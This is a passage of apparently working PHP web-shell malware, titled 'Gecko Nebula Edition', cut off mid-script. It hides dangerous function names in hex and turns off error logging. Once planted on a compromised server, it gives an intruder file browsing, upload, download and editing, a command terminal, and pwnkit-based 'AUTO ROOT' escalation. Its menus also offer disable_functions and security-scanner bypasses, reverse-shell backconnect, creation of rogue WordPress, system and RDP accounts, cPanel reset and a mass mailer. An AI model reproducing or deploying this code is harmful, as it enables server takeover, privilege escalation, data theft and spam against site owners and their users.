<?php
@set_time_limit(0);
@clearstatcache();
@ini_set('error_log', NULL);
@ini_set('log_errors', 0);
@ini_set('max_execution_time', 0);
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
# function WAF

$Array = [
    '676574637764', # ge  tcw d => 0
    '676c6f62', # gl ob => 1
    '69735f646972', # is_d ir => 2
    '69735f66696c65', # is_ file => 3
    '69735f7772697461626c65', # is_wr iteable => 4
    '69735f7265616461626c65', # is_re adble => 5
    '66696c657065726d73', # fileper ms => 6
    '66696c65', # f ile => 7
    '7068705f756e616d65', # php_unam e => 8
    '6765745f63757272656e745f75736572', # getc urrentuser => 9
    '68746d6c7370656369616c6368617273', # html special => 10
    '66696c655f6765745f636f6e74656e7473', # fil e_get_contents => 11
    '6d6b646972', # mk dir => 12
    '746f756368', # to uch => 13
    '6368646972', # ch dir => 14
    '72656e616d65', # ren ame => 15
    '65786563', # exe c => 16
    '7061737374687275', # pas sthru => 17
    '73797374656d', # syst em => 18
    '7368656c6c5f65786563', # sh ell_exec => 19
    '706f70656e', # p open => 20
    '70636c6f7365', # pcl ose => 21
    '73747265616d5f6765745f636f6e74656e7473', # stre amgetcontents => 22
    '70726f635f6f70656e', # p roc_open => 23
    '756e6c696e6b', # un link => 24
    '726d646972', # rmd ir => 25
    '666f70656e', # fop en => 26
    '66636c6f7365', # fcl ose => 27
    '66696c655f7075745f636f6e74656e7473', # file_put_c ontents => 28
    '6d6f76655f75706c6f616465645f66696c65', # move_up loaded_file => 29
    '63686d6f64', # ch mod => 30
    '7379735f6765745f74656d705f646972', # temp _dir => 31
    '6261736536345F6465636F6465', # => bas e6 4 _decode => 32
    '6261736536345F656E636F6465', # => ba se6 4_ encode => 33
    '636f7079' # co py => 34
];
$hitung_array = count($Array);
for ($i = 0; $i < $hitung_array; $i++) {
    $fungsi[] = unx($Array[$i]);
}

if (isset($_GET['d'])) {
    $cdir = unx($_GET['d']);
    $fungsi[14]($cdir);
} else {
    $cdir = $fungsi[0]();
}

function file_ext($file)
{
    if (mime_content_type($file) == 'image/png' or mime_content_type($file) == 'image/jpeg') {
        return '<i class="fa-regular fa-image" style="color:#09e3a5"></i>';
    } else if (mime_content_type($file) == 'application/x-httpd-php' or mime_content_type($file) == 'text/html') {
        return '<i class="fa-solid fa-file-code" style="color:#0985e3"></i>';
    } else if (mime_content_type($file) == 'text/javascript') {
        return '<i class="fa-brands fa-square-js"></i>';
    } else if (mime_content_type($file) == 'application/zip' or mime_content_type($file) == 'application/x-7z-compressed') {
        return '<i class="fa-solid fa-file-zipper" style="color:#e39a09"></i>';
    } else if (mime_content_type($file) == 'text/plain') {
        return '<i class="fa-solid fa-file" style="color:#edf7f5"></i>';
    } else if (mime_content_type($file) == 'application/pdf') {
        return '<i class="fa-regular fa-file-pdf" style="color:#ba2b0f"></i>';
    } else {
        return '<i class="fa-regular fa-file-code" style="color:#0985e3"></i>';
    }
}

function download($file)
{

    if (file_exists($file)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename=' . basename($file));
        header('Content-Transfer-Encoding: binary');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($file));
        ob_clean();
        flush();
        readfile($file);
        exit;
    }
}

if ($_GET['don'] == true) {
    $FilesDon = download(unx($_GET['don']));
}
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="robots" content="noindex, nofollow">
    <meta name="googlebot" content="noindex">
    <title>Gecko Nebula Edition [ <?= $_SERVER['SERVER_NAME']; ?> ]</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/codemirror.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/theme/ayu-mirage.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/addon/hint/show-hint.min.css">
    <script src="https://kit.fontawesome.com/057b9b510c.js" crossorigin="anonymous"></script>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
    <script src="//cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/codemirror.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/mode/xml/xml.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/mode/javascript/javascript.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/addon/hint/show-hint.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/addon/hint/xml-hint.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/addon/hint/html-hint.min.js"></script>
    <style>
        @media screen and (min-width: 768px) and (max-width: 1200px) and (min-height:720px) {
            .code-editor-container {
                height: 85vh !important;
            }

            .CodeMirror {
                height: 72vh !important;
                font-size: xx-large !important;
                margin: 0 4px;
                border-radius: 4px;
            }

            .btn-modal-close {
                padding: 15px 40px !important;
            }
        }

        .btn-submit,
        a {
            text-decoration: none;
            color: #fff
        }

        a,
        body {
            color: #fff

        }

        .btn-submit,
        .form-file,
        tbody tr:nth-child(2n) {
            background-color: #00000036
        }

        .code-editor,
        .modal,
        .terminal {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0
        }

        .code-editor-body textarea,
        .terminal-body textarea {
            width: 98.5%;
            height: 400px;
            font-size: smaller;
            resize: none
        }

        .menu-tools li,
        .terminal-body li,
        .terminal-head li {
            display: inline-block
        }

        body {
                background-image: url('https://cdn1.epicgames.com/ue/product/Screenshot/Untitled-3-1920x1080-f48c1067c4488969c7e6bd2871f0e5bc.jpg');

            font-family: monospace
        }

        .btn-modal-close:hover,
        .btn-submit:hover,
        .menu-file-manager ul,
        .path-pwd,
        thead {
            background-color: #00000057
        }

        ul {
            list-style: none
        }

        .menu-header li {
            padding: 5px 0
        }

        .menu-header ul li {
            font-weight: 700;
            font-style: italic
        }

        .btn-submit {
            padding: 7px 25px;
            border: 2px solid grey;
            border-radius: 4px
        }

        .form-file,
        a:hover {
            color: #c5c8d6
        }

        .btn-submit:hover {
            border: 2px solid #c5c8d6
        }

        .form-upload {
            margin: 10px 0
        }

        .form-file {
            border: 2px solid grey;
            padding: 7px 20px;
            border-radius: 4px
        }

        .menu-tools {
            width: 95%
        }

        .menu-tools li {
            margin: 15px 0
        }

        .menu-file-manager,
        .modal-mail-text {
            margin: 10px 40px
        }

        .menu-file-manager li {
            display: inline-block;
            margin: 15px 20px
        }

        .menu-file-manager li a::after {
            content: "";
            display: block;
            border-bottom: 1px solid #fff
        }

        .path-pwd {
            padding: 15px 0;
            margin: 5px 0
        }

        table {
            border-radius: 5px
        }

        thead {
            height: 35px
        }

        tbody tr td {
            padding: 10px 0
        }

        tbody tr td:nth-child(2),
        tbody tr td:nth-child(3),
        tbody tr td:nth-child(4) {
            text-align: center
        }

        ::-webkit-scrollbar {
            width: 16px
        }

        ::-webkit-scrollbar-track {
            background: #0e0f17
        }

        ::-webkit-scrollbar-thumb {
            background: #22242d;
            border: 2px solid #555;
            border-radius: 4px
        }

        ::-webkit-scrollbar-thumb:hover {
            background: #555
        }

        ::-webkit-file-upload-button {
            display: none
        }

        .modal {
            display: none;
            z-index: 2;
            width: 100%;
            background-color: rgba(0, 0, 0, .3)
        }

        .modal-container {
            animation-name: modal-pop-out;
            animation-duration: .7s;
            animation-fill-mode: both;
            margin: 10% auto auto;
            border-radius: 10px;
            width: 800px;
            background-color: #f4f4f9
        }

        @keyframes modal-pop-out {
            from {
                opacity: 0
            }

            to {
                opacity: 1
            }
        }

        .modal-header {
            color: #000;
            margin-left: 30px;
            padding: 10px
        }

        .modal-body,
        .terminal-head li {
            color: #000
        }

        .modal-create-input {
            width: 700px;
            padding: 10px 5px;
            background-color: #f4f4f9;
            margin: 0 5%;
            border: none;
            border-radius: 4px;
            box-shadow: 8px 8px 20px rgba(0, 0, 0, .2);
            border-bottom: 2px solid #0e0f17
        }

        .box-shadow {
            box-shadow: 8px 8px 8px rgba(0, 0, 0, .2)
        }

        .btn-modal-close {
            background-color: #22242d;
            color: #fff;
            border: none;
            border-radius: 4px;
            padding: 8px 35px
        }

        .badge-action-chmod:hover::after,
        .badge-action-download:hover::after,
        .badge-action-editor:hover::after {
            padding: 5px;
            border-radius: 5px;
            margin-left: 110px;
            background-color: #2e313d
        }

        .modal-btn-form {
            margin: 15px 0;
            padding: 10px;
            text-align: right
        }

        .file-size {
            color: orange
        }

        .badge-root::after {
            content: "root";
            display: block;
            position: absolute;
            width: 40px;
            text-align: center;
            margin-top: -30px;
            margin-left: 110px;
            border-radius: 4px;
            background-color: red
        }

        .badge-premium::after {
            content: "soon!";
            display: block;
            position: absolute;
            width: 40px;
            text-align: center;
            margin-top: -30px;
            margin-left: 140px;
            border-radius: 4px;
            background-color: red
        }

        .badge-action-chmod:hover::after,
        .badge-action-download:hover::after,
        .badge-action-editor:hover::after,
        .badge-linux::after,
        .badge-windows::after {
            width: 60px;
            text-align: center;
            margin-top: -30px;
            display: block;
            position: absolute
        }

        .badge-windows::after {
            background-color: orange;
            color: #000;
            margin-left: 100px;
            border-radius: 4px;
            content: "windows"
        }

        .badge-linux::after {
            margin-left: 100px;
            border-radius: 4px;
            background-color: #0047a3;
            content: "linux"
        }

        .badge-action-editor:hover::after {
            content: "Rename"
        }

        .badge-action-chmod:hover::after {
            content: "Chmod"
        }

        .badge-action-download:hover::after {
            content: "Download"
        }

        .CodeMirror {
            height: 70vh;
        }

        .code-editor,
        .terminal {
            background-color: rgba(0, 0, 0, .3);
            width: 100%
        }

        .code-editor-container {
            background-color: #f4f4f9;
            color: #000;
            width: 90%;
            height: 90vh;
            margin: 20px auto auto;
            border-radius: 10px
        }

        .code-editor-head {
            padding: 15px;
            font-weight: 700
        }

        .terminal-container {
            animation: .5s both modal-pop-out;
            width: 90%;
            background-color: #f4f4f9;
            margin: 25px auto auto;
            color: #000;
            border-radius: 4px
        }

        .bc-geckonebula,
        .mail,
        .terminal-input {
            background-color: #22242d;
            color: #fff
        }

        .terminal-head {
            padding: 8px
        }

        .terminal-head li a {
            color: #000;
            position: absolute;
            right: 0;
            margin-right: 110px;
            font-weight: 700;
            margin-top: -20px;
            font-size: 25px;
            padding: 1px 10px
        }

        .terminal-body textarea {
            margin: 4px;
            background-color: #22242d;
            color: #29db12;
            border-radius: 4px
        }

        .active {
            display: block
        }

        .terminal-input {
            width: 500px;
            padding: 6px;
            border: 1px solid #22242d;
            border-radius: 4px;
            margin: 5px 0
        }

        .bc-geckonebula {
            border: none;
            padding: 7px 10px;
            width: 712px;
            border-radius: 5px;
            margin: 15px 40px
        }

        .mail {
            width: 705px;
            resize: none;
            height: 100px
        }

        .logo-geckonebula {
            position: absolute;
            top: -90px;
            right: 40px;
            z-index: -1;
            bottom: 0
        }
    </style>
</head>

<body>
    <div class="menu-header">
        <ul>
            <li><i class="fa-solid fa-computer"></i>&nbsp;<?= $fungsi[8](); ?></li>
            <li><i class="fa-solid fa-server"></i>&nbsp;<?= $_SERVER["\x53\x45\x52\x56\x45\x52\x5f\x53\x4f\x46\x54\x57\x41\x52\x45"]; ?></li>
            <li><i class="fa-solid fa-network-wired"></i>&nbsp;: <?= gethostbyname($_SERVER["\x53\x45\x52\x56\x45\x52\x5f\x41\x44\x44\x52"]); ?> |&nbsp;: <?= $_SERVER["\x52\x45\x4d\x4f\x54\x45\x5f\x41\x44\x44\x52"]; ?></li>
            <li><i class="fa-solid fa-globe"></i>&nbsp;<?= s(); ?></li>
            <li><i class="fa-brands fa-php"></i>&nbsp;<?= PHP_VERSION; ?></li>
            <li><i class="fa-solid fa-user"></i>&nbsp;<?= $fungsi[9](); ?></li>
            <li><i class="fa-solid fa-user"></i>&nbsp;HaxorSec X Gecko Nebula Version</li>
            <li class="logo-geckonebula"><img width="400" height="400" src="//i.ibb.co.com/pPPTqkG/haxgecko.png" align="right"></li>
            <form action="" method="post" enctype='<?= "\x6d\x75\x6c\x74\x69\x70\x61\x72\x74\x2f\x66\x6f\x72\x6d\x2d\x64\x61\x74\x61"; ?>'>
                <li class="form-upload">
                    <input type="submit" value="Upload" name="geckonebula-up-submit" class="btn-submit">&nbsp;<input type="file" name="geckonebula-upload" class="form-file">
                </li>
            </form>
            <li><i class="fa-solid fa-user"></i>&nbsp;Bitninja Bypass Upload</li>
            <form action="" method="post" enctype='<?= "\x6d\x75\x6c\x74\x69\x70\x61\x72\x74\x2f\x66\x6f\x72\x6d\x2d\x64\x61\x74\x61"; ?>'>
                <li class="form-upload">
                    <input type="submit" value="Upload" name="geckonebula-bitninja-up-submit" class="btn-submit">&nbsp;<input type="file" name="geckonebula-bitninja-upload" class="form-file">
                </li>
            </form>
        </ul>
    </div>
    <div class="menu-tools">
        <ul>
            <li><a href="?d=<?= hx($fungsi[0]()) ?>&terminal=normal" class="btn-submit"><i class="fa-solid fa-terminal"></i> Terminal</a></li>
            <li><a href="?d=<?= hx($fungsi[0]()) ?>&terminal=bypasser" class="btn-submit"><i class="fa-solid fa-terminal"></i> PHP7x BYPASS</a></li>
            <li><a href="?d=<?= hx($fungsi[0]()) ?>&php=chankro" class="btn-submit"><i class="fa-solid fa-terminal"></i> PHP5x BYPASS</a></li>
            <li><a href="?d=<?= hx($fungsi[0]()) ?>&terminal=root" class="btn-submit badge-root"><i class="fa-solid fa-user-lock"></i> AUTO ROOT</a></li>
            <li><a href="?d=<?= hx($fungsi[0]()) ?>&adminer" class="btn-submit"><i class="fa-solid fa-database"></i> Adminer</a></li>
            <li><a href="?d=<?= hx($fungsi[0]()) ?>&destroy" class="btn-submit"><i class="fa-solid fa-ghost"></i> Backdoor Destroyer</a></li>
            <li><a href="//www.exploit-db.com/search?q=Linux%20Kernel%20<?= suggest_exploit(); ?>" class="btn-submit"><i class="fa-solid fa-flask"></i> Linux Exploit</a></li>
            <li><a href="?d=<?= hx($fungsi[0]()) ?>&lockshell" class="btn-submit"><i class="fa-brands fa-linux"></i> Lock Shell</a></li>
            <li><a href="" class="btn-submit badge-linux" id="lock-file"><i class="fa-brands fa-linux"></i> Lock File</a></li>
            <li><a href="" class="btn-submit badge-root" id="root-user"><i class="fa-solid fa-user-plus"></i> Create User</a></li>
            <li><a href="" class="btn-submit" id="create-rdp"><i class="fa-solid fa-laptop-file"></i> CREATE RDP</a></li>
            <li><a href="?d=<?= hx($fungsi[0]()) ?>&mailer" class="btn-submit"><i class="fa-solid fa-envelope"></i> PHP Mailer</a></li>
            <li><a href="?d=<?= hx($fungsi[0]()) ?>&backconnect" class="btn-submit"><i class="fa-solid fa-user-secret"></i> BACKCONNECT</a></li>
            <li><a href="?d=<?= hx($fungsi[0]()) ?>&unlockshell" class="btn-submit"><i class="fa-solid fa-unlock-keyhole"></i> UNLOCK SHELL</a></li>
            <li><a href="//hashes.com/en/tools/hash_identifier" class="btn-submit"><i class="fa-solid fa-code"></i> HASH IDENTIFIER</a></li>
            <li><a href="?d=<?= hx($fungsi[0]()) ?>&cpanelreset" class="btn-submit"><i class="fa-brands fa-cpanel"></i> CPANEL RESET</a></li>
            <li><a href="?d=<?= hx($fungsi[0]()) ?>&createwp" class="btn-submit"><i class="fa-brands fa-wordpress-simple"></i> CREATE WP USER</a></li>
        </ul>
    </div>

    <?php

    $file_manager = $fungsi[1]("{.[!.],}*", GLOB_BRACE);
    $get_cwd = $fungsi[0]();
    ?>

    <div class="menu-file-manager">
        <ul>
            <li><a href="" id="create_folder">+ Create Folder</a></li>
            <li><a href="" id="create_file">+ Create File</a></li>
        </ul>
        <div class="path-pwd">
            <?php
            $cwd = str_replace("\\", "/", $get_cwd); // untuk dir garis windows
            $pwd = explode("/", $cwd);
            if (stristr(PHP_OS, "WIN")) {
                windowsDriver();
            }
            foreach ($pwd as $id => $val) {
                if ($val == '' && $id == 0) {
                    echo '&nbsp;<a href="?d=' . hx('/') . '"><i class="fa-solid fa-folder-plus"></i>&nbsp;/ </a>';
                    continue;
                }
                if ($val == '') continue;
                echo '<a href="?d=';
                for ($i = 0; $i <= $id; $i++) {
                    echo hx($pwd[$i]);
                    if ($i != $id) echo hx("/");
                }
                echo '">' . $val . ' / ' . '</a>';
            }
            echo "<a style='font-weight:bold; color:orange;' href='?d=" . hx(__DIR__) . "'>[ HOME SHELL ]</a>&nbsp;";
            ?>
        </div>
        </ul>
        <table style="width: 100%;">
            <thead>
                <tr>
                    <th>Name</th>
                    <th>Size</th>
                    <th>Permission</th>
                    <th>Action</th>
                </tr>
            </thead>
            <form action="" method="post">
                <tbody>
                    <!-- geckonebula Folder File Manager -->
                    <?php foreach ($file_manager as $_D) : ?>
                        <?php if ($fungsi[2]($_D)) : ?>
                            <tr>
                                <td><input type="checkbox" name="check[]" value="<?= $_D ?>">&nbsp;<i class="fa-solid fa-folder-open" style="color:orange;"></i>&nbsp;<a href="?d=<?= hx($fungsi[0]() . "/" . $_D); ?>"><?= namaPanjang($_D); ?></a></td>
                                <td>[ DIR ]</td>
                                <td>
                                    <?php if ($fungsi[4]($fungsi[0]() . '/' . $_D)) {
                                        echo '<font color="#00ff00">';
                                    } elseif (!$fungsi[5]($fungsi[0]() . '/' . $_D)) {
                                        echo '<font color="red">';
                                    }
                                    echo perms($fungsi[0]() . '/' . $_D);
                                    ?>
                                </td>
                                <!-- Action Folder Manager -->
                                <td><a href="?d=<?= hx($fungsi[0]()); ?>&re=<?= hx($_D) ?>" class="badge-action-editor"><i class="fa-solid fa-pen-to-square"></i></a>&nbsp;<a href="?d=<?= hx($fungsi[0]()); ?>&ch=<?= hx($_D) ?>" class="badge-action-chmod"><i class="fa-solid fa-user-pen"></i></a></td>
                            </tr>
                        <?php endif; ?>
                    <?php endforeach; ?>
                    <!-- geckonebula Files Manager -->
                    <?php foreach ($file_manager as $_F) : ?>
                        <?php if ($fungsi[3]($_F)) : ?>
                            <tr>
                                <td><input type="checkbox" name="check[]" value="<?= $_F ?>">&nbsp;<?= file_ext($_F) ?>&nbsp;<a href="?d=<?= hx($fungsi[0]()); ?>&f=<?= hx($_F); ?>" class="gecko-files"><?= namaPanjang($_F); ?></a></td>
                                <td><?= formatSize(filesize($_F)); ?></td>
                                <td>
                                    <?php if (is_writable($fungsi[0]() . '/' . $_D)) {
                                        echo '<font color="#00ff00">';
                                    } elseif (!is_readable($fungsi[0]() . '/' . $_F)) {
                                        echo '<font color="red">';
                                    }
                                    echo perms($fungsi[0]() . '/' . $_F);
                                    ?>
                                </td>
                                <!-- Action File Manager -->
                                <td><a href="?d=<?= hx($fungsi[0]()); ?>&re=<?= hx($_F) ?>" class="badge-action-editor"><i class="fa-solid fa-pen-to-square"></i></a>&nbsp;<a href="?d=<?= hx($fungsi[0]()); ?>&ch=<?= hx($_F) ?>" class="badge-action-chmod"><i class="fa-solid fa-user-pen"></i></a>&nbsp;<a href="?d=<?= hx($fungsi[0]()); ?>&don=<?= hx($_F) ?>" class="badge-action-download"><i class="fa-solid fa-download"></i></a></td>
                            </tr>
                        <?php endif; ?>
                    <?php endforeach; ?>
                </tbody>
        </table>
        <br>
        <select name="geckonebula-select" class="btn-submit">
            <option value="delete">Delete</option>
            <option value="unzip">Unzip</option>
            <option value="zip">Zip</option><br>
        </select>
        <input type="submit" name="submit-action" value="Submit" class="btn-submit" style="padding: 8.3px 35px;">
        </form>

        <!-- Modal Pop Jquery Create Folder/File By ./MrMad -->
        <div class="modal">
            <div class="modal-container">
                <div class="modal-header">
                    <h3><b><i id="modal-title">${this.title}</i></b></h3>
                </div>
                <form action="" method="post">
                    <div class="modal-body">
                        <div id="modal-body-bc"></div>
                        <span id="modal-input"></span>
                        <div class="modal-btn-form">
                            <input type="submit" name="submit" value="Submit" class="btn-modal-close box-shadow">&nbsp;<button class="btn-modal-close box-shadow" id="close-modal">Close</button>
                        </div>
                </form>
            </div>
        </div>
    </div>
    </div>
    <?php if (isset($_GET['cpanelreset'])) : ?>
        <div class="modal active">
            <div class="modal-container">
                <div class="modal-header">
                    <h3><b><i id="modal-title">:: Cpanel Reset </i></b></h3>
                </div>
                <form action="" method="post">
                    <div class="modal-body">
                        <div class="modal-isi">
                            <form action="" method="post">
                                <input type="email" name="resetcp" class="modal-create-input" placeholder="Your email : example@mail.com">
                        </div>
                        <div class="modal-btn-form">
                            <input type="submit" name="submit" value="Submit" class="btn-modal-close box-shadow">&nbsp;<a class="btn-modal-close box-shadow" href="?d=<?= hx($fungsi[0]()) ?>">Close</a>
                        </div>
                </form>
            </div>
        </div>
    <?php endif; ?>
    <?php if (isset($_GET['createwp'])) : ?>
        <div class="modal active">
            <div class="modal-container">
                <div class="modal-header">
                    <h3><b><i id="modal-title">
                                <center>CREATE WORDPRESS ADMIN PASSWORD</center>
                            </i></b></h3>
                </div>
                <form action="" method="post">
                    <div class="modal-body">
                        <div class="modal-isi">
                            <form action="" method="post">
                                <input type="text" name="db_name" class="modal-create-input" placeholder="DB_NAME">
                                <br><br>
                                <input type="text" name="db_user" class="modal-create-input" placeholder="DB_USER">
                                <br><br>
                                <input type="text" name="db_password" class="modal-create-input" placeholder="DB_PASSWORD">
                                <br><br>
                                <input type="text" name="db_host" class="modal-create-input" placeholder="DB_HOST" value="127.0.0.1">
                                <br><br>
                                <hr size="2" color="black" style="margin:0px 30px; border-radius:3px;">
                                <br><br>
                                <input type="text" name="wp_user" class="modal-create-input" placeholder="Your Username">
                                <br><br>
                                <input type="text" name="wp_pass" class="modal-create-input" placeholder="Your Password">
                                <br><br>
                        </div>
                        <div class="modal-btn-form">
                            <input type="submit" name="submitwp" value="Submit" class="btn-modal-close box-shadow">&nbsp;<a class="btn-modal-close box-shadow" href="?d=<?= hx($fungsi[0]()) ?>">Close</a>
                        </div>
                </form>
            </div>
        </div>
    <?php endif; ?>
    <?php if (isset($_GET['backconnect'])) : ?>
        <div class="modal active">
            <div class="modal-container">
                <div class="modal-header">
                    <h3><b><i id="modal-title">:: Backconnect</i></b></h3>
                </div>
                <form action="" method="post">
                    <div class="modal-body">
                        <select class="bc-geckonebula box-shadow" name="geckonebula-bc">
                            <option value="-">Choose Backconnect</option>
                            <option value="perl">Perl</option>
                            <option value="python">Python</option>
                            <option value="ruby">Ruby</option>
                            <option value="bash">Bash</option>
                            <option value="php">php</option>
                            <option value="nc">nc</option>
                            <option value="sh">sh</option>
                            <option value="xterm">Xterm</option>
                            <option value="golang">Golang</option>
                        </select>
                        <input type="text" name="backconnect-host" class="modal-create-input" placeholder="127.0.0.1">
                        <br><br>
                        <input type="number" name="backconnect-port" class="modal-create-input" placeholder="1337">
                        <div class="modal-btn-form">
                            <input type="submit" name="submit-bc" value="Submit" class="btn-modal-close box-shadow">&nbsp;<a class="btn-modal-close box-shadow" href="?d=<?= hx($fungsi[0]()) ?>">Close</a>
                        </div>
                </form>
            </div>
        </div>
    <?php endif; ?>
    <?php if (isset($_GET['mailer'])) : ?>
        <div class="modal active">
            <div class="modal-container">
                <div class="modal-header">
                    <h3><b><i id="modal-title">:: PHP Mailer</i></b></h3>
                </div>
                <form action="" method="post">
                    <div class="modal-body">
                        <div class="modal-isi">
                            <form action="" method="post">
                                <div class="modal-mail-text">
                                    <textarea name="message-smtp" class="box-shadow mail" placeholder="&nbsp;Your Text here!"></textarea>
                                </div>
                                <br>
                                <input type="text" name="mailto-subject" class="modal-create-input" placeholder="Subject">
                                <br><br>
                                <input type="email" name="mail-from-smtp" class="modal-create-input" placeholder="from : example@mail.com">
                                <br><br>
                                <input type="email" name="mail-to-smtp" class="modal-create-input" placeholder="to : example@mail.com">
                        </div>
                        <div class="modal-btn-form">
                            <input type="submit" name="submit" value="Submit" class="btn-modal-close box-shadow">&nbsp;<a class="btn-modal-close box-shadow" href="?d=<?= hx($fungsi[0]()) ?>">Close</a>
                        </div>
                </form>
            </div>
        </div>
    <?php endif; ?>
    <?php if ($_GET['f']) : ?>
        <div class="code-editor">
            <div class="code-editor-container">
                <div class="code-editor-head">
                    <h3><i class="fa-solid fa-code"></i>&nbsp; Code Editor : <?= unx($_GET['f']); ?></h3>
                </div>
                <div class="code-editor-body">
                    <form action="" method="post">
                        <textarea name="code-editor" id="code" class="box-shadow" autofocus><?= $fungsi[10]($fungsi[11]($fungsi[0]() . "/" . unx($_GET['f']))); ?></textarea>
                        <div class="modal-btn-form">
                            <input type="submit" name="save-editor" value="Save" class="btn-modal-close">&nbsp;<button class="btn-modal-close" id="close-editor">Close</button>
                        </div>
                    </form>
                </div>
            </div>
        </div>
    <?php endif; ?>
    <?php if ($_GET['terminal'] == "normal") : ?>
        <div class="terminal">
            <div class="terminal-container">
                <div class="terminal-head">
                    <ul>
                        <li id="terminal-title"><b><i class="fa-solid fa-terminal"></i>&nbsp;TERMINAL</b></li>
                        <li><a href="" class="close-terminal"><i class="fa-solid fa-right-from-bracket"></i></a></li>
                    </ul>
                </div>
                <div class="terminal-body">
                    <textarea class="box-shadow" disabled><?php
                                                            if (isset($_POST['terminal'])) {
                                                                echo $fungsi[10](cmd($_POST['terminal-text'] . " 2>&1"));
                                                            }
                                                            ?></textarea>
                    <form action="" method="post">
                        <ul>
                            <li><input type="text" name="terminal-text" class="terminal-input box-shadow" placeholder="<?= $fungsi[9]() . "@" . $_SERVER["\x53\x45\x52\x56\x45\x52\x5f\x41\x44\x44\x52"]; ?>" autofocus></li>
                            <li><input type="submit" name="terminal" value=">" class="btn-modal-close"></li>
                        </ul>
                    </form>
                </div>
            </div>
        </div>
    <?php endif; ?>
    <?php if ($_GET['terminal'] == "root") : ?>
        <div class="terminal">
            <div class="terminal-container">
                <div class="terminal-head">
                    <ul>
                        <li id="terminal-title"><b><i class="fa-solid fa-terminal"></i>&nbsp;AUTO ROOT</b></li>
                        <li><a href="" class="close-terminal"><i class="fa-solid fa-right-from-bracket"></i></a></li>
                    </ul>
                </div>
                <div class="terminal-body">
                    <textarea name="" disabled><?php if ($fungsi[3]('.mad-root') && $fungsi[3]('pwnkit')) {
                                                    $response = $fungsi[11]('.mad-root');
                                                    $r_text = explode(" ", $response);
                                                    if ($r_text[0] == "uid=0(root)") {
                                                        if (isset($_POST['submit-root'])) {
                                                            echo cmd('./pwnkit "' . $_POST['root-terminal'] . '  2>&1"');
                                                        }
                                                    } else {
                                                        echo "This Device Is Not Vulnerable\n";
                                                        echo cmd('cat /etc/os-release') . "\n";
                                                        echo "Kernel Version : " . suggest_exploit() . "\n";
                                                    }
                                                } else {
                                                    $fungsi[24]('.mad-root');
                                                } ?></textarea>
                    <form action="" method="post">
                        <ul>
                            <li><input type="text" name="root-terminal" class="terminal-input" placeholder="<?= "root" . "@" . $_SERVER["\x53\x45\x52\x56\x45\x52\x5f\x41\x44\x44\x52"]; ?>" autofocus></li>
                            <li><input type="submit" name="submit-root" value=">" class="btn-modal-close"></li>
                        </ul>
                    </form>
                </div>
            </div>
        </div>
    <?php endif; ?>
    <?php if ($_GET['re'] == true) : ?>
        <div class="modal active">
            <div class="modal-container">
                <div class="modal-header">
                    <h3><b><i id="modal-title">Rename : <?= unx($_GET['re']) ?></i></b></h3>
                </div>
                <div class="modal-body">
                    <form action="" method="post">
                        <span id="modal-input"><input type="text" name="renameFile" class="modal-create-input" placeholder="Rename"></span>
                        <div class="modal-btn-form">
                            <input type="submit" name="submit" value="Submit" class="btn-modal-close box-shadow">&nbsp;<button class="btn-modal-close box-shadow close-btn-s">Close</button>
                        </div>
                    </form>
                </div>
            </div>
        </div>
        </div>
    <?php endif; ?>
    <?php if ($_GET['ch'] == true) : ?>
        <div class="modal active">
            <div class="modal-container">
                <div class="modal-header">
                    <h3><b><i id="modal-title">Change Permission : <?= unx($_GET['ch']) ?></i></b></h3>
                </div>
                <div class="modal-body">
                    <form action="" method="post">
                        <span id="modal-input"><input type="number" name="chFile" class="modal-create-input" placeholder="0775"></span>
                        <div class="modal-btn-form">
                            <input type="submit" name="submit" value="Submit" class="btn-modal-close box-shadow">&nbsp;<button class="btn-modal-close box-shadow close-btn-s">Close</button>
                        </div>
                    </form>
                </div>
            </div>
        </div>
        </div>
    <?php endif; ?>
    <script>
        $(document).ready(function() {


            $('#create_folder').click(function() {
                $('.modal').show();
                $('#modal-title').html('<i class="fa-solid fa-folder-plus"></i>&nbsp;Create Folder');
                $('#modal-input').html('<input type="text" name="create_folder" class="modal-create-input" placeholder="Create Folder">');
                event.preventDefault();
            });
            $('#create_file').click(function() {
                $('.modal').show();
                $('#modal-title').html('<i class="fa-solid fa-file-circle-plus"></i>&nbsp;Create File');
                $('#modal-input').html('<input type="text" name="create_file" class="modal-create-input" placeholder="Create File">');
                event.preventDefault();
            });
            $('#lock-file').click(function() {
                $('.modal').show();
                $('#modal-title').html('<i class="fa-solid fa-lock"></i>&nbsp;LOCK FILE');
                $('#modal-input').html('<input type="text" name="lockfile" class="modal-create-input" placeholder="Your File Name">');
                event.preventDefault();
            });
            $('#root-user').click(function() {
                $('.modal').show();
                $('#modal-title').html('<i class="fa-solid fa-user-plus"></i>&nbsp;ADD USER');
                $('#modal-input').html('<input type="text" name="add-username" class="modal-create-input" placeholder="Username"><br><br><input type="text" name="add-password" class="modal-create-input" placeholder="Password">');
                event.preventDefault();
            });

            $('#create-rdp').click(function() {
                $('.modal').show();
                $('#modal-title').html(':: CREATE RDP');
                $('#modal-input').html('<input type="text" name="add-rdp" class="modal-create-input" placeholder="Username"><br><br><input type="text" name="add-rdp-pass" class="modal-create-input" placeholder="Password">');
                event.preventDefault();
            });

            $('#close-modal').click(function() {
